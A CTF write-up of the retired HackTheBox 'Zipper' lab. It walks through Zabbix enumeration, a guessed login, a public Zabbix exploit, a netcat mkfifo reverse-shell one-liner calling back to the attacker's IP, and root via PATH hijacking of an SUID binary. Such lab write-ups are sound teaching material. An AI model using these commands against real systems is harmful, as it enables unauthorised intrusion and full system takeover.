<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Zipper Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-zipper-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-02-26T08:57:26+00:00">February 26, 2019</time><time class="updated" datetime="2025-06-29T13:41:41+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Zipper”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Hard</span></p>
<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Zipper is 10.10.10.108</span></p>
<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (80)</span></li>
<li><span style="color: #000000;">Directory enumeration using gobuster</span></li>
<li><span style="color: #000000;">Logging in as a Guest User</span></li>
<li><span style="color: #000000;">Enumerating for Login Credentials</span></li>
<li><span style="color: #000000;">Logging in through </span>zabbix<span style="color: #000000;">–</span>cli</li>
<li><span style="color: #000000;">Giving permissions to access GUI</span></li>
<li><span style="color: #000000;">Getting a reverse shell using </span>zabbix<span style="color: #000000;"> exploit</span></li>
<li><span style="color: #000000;">Retrieving User flag</span></li>
<li><span style="color: #000000;">Modify the Environment PATH to run systemctl</span></li>
<li><span style="color: #000000;">Snagging the Root Flag</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<p><span style="color: #000000;">Let’s start off with our basic Nmap command to find out the open ports and services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.108</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-h1dRcr3qwwc/XHT3odnqKII/AAAAAAAAdB8/kUML5jWGITsO5Fm-ierReiQG3oKWfnidwCLcBGAs/s1600/1.png"/></p>
<p>The Nmap scan shows us that there are 2 ports open: 22(SSH), 80(HTTP)</p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p>As port is 80 is running HTTP service, we access the web service using the web browser.</p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-inb4msscgns/XHT3qsuuvgI/AAAAAAAAdCc/Rfje2TuC9r4jma87PQO2BoTvtUFneJ92gCLcBGAs/s1600/2.png"/></p>
<p>Now we run gobuster to enumerate the directories of the web service and find a directory called /zabbix.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster -s '200,204,301,302,307,403,500' -e -t 20 -u http://10.10.10.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-WJHvD5PZF1U/XHT3swp21eI/AAAAAAAAdC4/UzUipzc6uPoBp-GJepOl9RVOGWH02tzQgCLcBGAs/s1600/3.png"/></p>
<p>We open the “zabbix” directory and find a login page for Zabbix web portal.</p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-ojm6Ia07ObU/XHT3tozQ6UI/AAAAAAAAdDI/h_XczZZH4NYMvSrv8mEki7p0FS5aYZUrgCLcBGAs/s1600/4.png"/></p>
<p>Now we login as guest and are able to access the dashboard.</p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-1HYITUKdQYU/XHT3ufcza5I/AAAAAAAAdDM/6hMuwFnYlQc7B820jVSQ3X8pOYUyzIXtwCLcBGAs/s1600/5.png"/></p>
<p>Enumerating the web application, inside “Latest data<span style="color: #000000;">” in monitoring data</span> we get a hint for the username as “Zapper’s Backup script”.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ioDStoh9_ik/XHT3uRx_QgI/AAAAAAAAdDQ/6NpglfpsfnkxPoZGcX2SYKg_LtTgOxwewCLcBGAs/s1600/6.png"/></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p>Now we try to login again as user “zapper”. We try to login using the username and password the same i.e. “zapper: zapper”.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-qoLOqYLP4mw/XHT3uoPDA5I/AAAAAAAAdDU/qr0iYqAbzNUYVE-iDqDyFHmPo26GI0_dQCLcBGAs/s1600/7.png"/></p>
<p>When we try to login, we get an error stating the “GUI access disabled”.</p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Q9oW2UnFMb8/XHT3vD__vtI/AAAAAAAAdDY/ci2SaSIDtsY1eAhpCEMEJHR1-g4Hzhk5gCLcBGAs/s1600/8.png"/></p>
<p>As we do not have GUI access, we use zabbix-cli to connect the zabbix api and we check the available users. Now we can either create a user with GUI access or add an existing user to a group with GUI. In this case, we first create a new group called hack with GUI access enabled.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zabbix-cli
show_users
create_usergroup</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hFWld3JZ3FY/XHT3ojCG77I/AAAAAAAAdCE/IRNAJSV3SrsZJOsqC3q-Fn5N36GXPqiPQCLcBGAs/s1600/10.png"/></p>
<p>Now add user “zapper” to the new group we created and we remove the user “zapper” from the previous group called “No access to the frontend”.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">add_user_to_usergroup
remove_user_from_usergroup
show_users</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zIcCpFZLybQ/XHT3oon_niI/AAAAAAAAdCA/CPkBG38Wrboz97s44TsOm8PJZyVkf_D2QCLcBGAs/s1600/11.png"/></p>
<p>Now we are successfully able to access the web portal as user “zapper”.</p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-5lxet19C_Fk/XHT3pB7XXEI/AAAAAAAAdCI/8RoycDUMBYsNEZzlO7kuYXyc8Iy1cVSXACLcBGAs/s1600/15.png"/></p>
<p>Searching for an exploit for Zabbix application, we find an exploit <a href="https://www.exploit-db.com/exploits/39937">here</a>. It requires username, password, and hostid to run the exploit successfully. As we have access to the dashboard, we can find the hostid of a container.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-H1oXJPaZuhk/XHT3pWgbiiI/AAAAAAAAdCM/EX3JIiNl5BEhV2riayfhZkkPrQmrj3k1ACLcBGAs/s1600/16.png"/></p>
<p>Now we edit the exploit according to the target application.</p>
<p><img decoding="async" src="https://2.bp.blogspot.com/--BG_lHNCq6E/XHT3pwYP59I/AAAAAAAAdCQ/oVHUVPJ6g38EpCtTpKIn-v0XVA_q7YdGQCLcBGAs/s1600/17.png"/></p>
<h4><span style="color: #800000;">Getting Reverse Shell</span></h4>
<p><span style="color: #000000;">We run the exploit and are able to get a shell. Now to get a reverse shell we setup our listener using netcat and run the bash one liner to get a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python exploit.py
whoami
rm /tmp/f;mkfifo /tmp/f;cat/tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 1234 &gt; /tmp/f</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-FUP5GFIhVDY/XHT3qPgAJ8I/AAAAAAAAdCU/NdLJcd1lMWccMxnoB53k9r4vCocRz27WACLcBGAs/s1600/18.png"/></p>
<p><span style="color: #000000;">Now when we check our listener, we find that we are successfully able to get a reverse shell. When we try to spawn a TTY shell using python, we find that the system doesn’t contain either python or python3. So we use </span>start<span style="color: #000000;"> to bash interactive shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty;pty.spawn('/bin/bash')"
which python
which python3
bash -i</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-afrrMMPYO-s/XHT3qUCRgfI/AAAAAAAAdCY/VM8nqIeJ-Lo5F18NAM85JDzbua4cLM5QQCLcBGAs/s1600/19.png"/></p>
<p><span style="color: #000000;">Enumerating the system, we find that we are inside a Docker container. We are able to find any solution to escape the container. If we take a look at the zabbix documentation page, we find there is an option called “execute_on”. To execute inside the container, we have to set this option as “0” and to execute on the server we have the to set this option as “1”. We edit the exploit and add these options in our exploit to get the reverse shell of the server.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/--Y4LLvl-RXs/XHT3rI1BrqI/AAAAAAAAdCg/nhRFmygSWvsWLcw61htxTDZJgBCMJIdIQCLcBGAs/s1600/21.png"/></p>
<p>Then, we run the exploit and use bash one liner to get a reverse shell.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python exploit.py
whoami
rm /tmp/f;mkfifo /tmp/f;cat/tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 1234 &gt; /tmp/f</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-mOOk3qu4BiI/XHT3rIYj4vI/AAAAAAAAdCk/yaGgoERhTps7eKGzLxXFBjXJLCkzuhjEACLcBGAs/s1600/22.png"/></p>
<p>We setup the listener and get a reverse shell on the server.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-CcQNrtJuSdA/XHT3ruX4fGI/AAAAAAAAdCo/OAWyfArTa9YVNyOQ3xiq0SlWfCSM5w3UwCLcBGAs/s1600/25.png"/></p>
<p>Then, we change the directory to “/home/zapper” and find a file called “user.txt”. We try to open the file and find that we do not have read permissions.</p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-Ax9P-A5eRLA/XHT3r_MRmxI/AAAAAAAAdCw/wZaxXvY1NBMtWdSS1bw7Zo0gw4HRIPoOQCLcBGAs/s1600/26.png"/></p>
<p><span style="color: #000000;">Now go to the “utils” directory and fi</span>nd a file called “backup.sh”. We open the file called find the password for user “zapper”.</p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-dNKBuLquHZA/XHT3r0zn9zI/AAAAAAAAdCs/kwlJDHxohh0iKY2H6KApfzgh_oU-fwe9QCLcBGAs/s1600/27.png"/></p>
<h4><span style="color: #800000;">Retrieving User flag then Snagging Root Flag</span></h4>
<p>We switch user to zapper and use the password we find inside the “backup.sh” file. After we switch user, we again try to open the “user.txt” file and find the first flag.</p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Bn4Foay8_OI/XHT3sfW1kfI/AAAAAAAAdC0/ux8w1FcnZq8JcXFVs9QssoYnxK_Dqk6XwCLcBGAs/s1600/29.png"/></p>
<p>We also find a file called “zabbix-service” with SUID bit set. We find that the program is executing “systemctl” when we check the program with strings.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-x805D0yyUNU/XHT3tE28STI/AAAAAAAAdDA/wEZ12Dsbf245noA-SaJYrGNSHmvKLovWgCLcBGAs/s1600/30.png"/></p>
<p>Now we can modify the PATH environment variable so that the program can run our malicious “systemctl”. We create a new systemctl file that executes /bin/bash and gives it executable permission. Then we change the PATH environment variable to the location in which our malicious file is stored and run the application. As soon as we run the program we get a root shell.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "/bin/bash" &gt; systemctl
chmod +x systemctl
PATH=~/:$PATH
utils/zabbix-service</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-EIY6cxKgu5c/XHT3s133N2I/AAAAAAAAdC8/RS6D5JUtvnE180mSvy3PrwZwQ0l0lVQbACLcBGAs/s1600/31.png"/></p>
<p>Now we change to /root directory and find a file called “root.txt”. We take a look at the content of the file and find our final flag.</p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-LMcgIUasl64/XHT3tjHZOgI/AAAAAAAAdDE/XNYkwcDLjlg9t_LUOjlmzCJqDosulSwJACLcBGAs/s1600/32.png"/></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Contact on <a href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
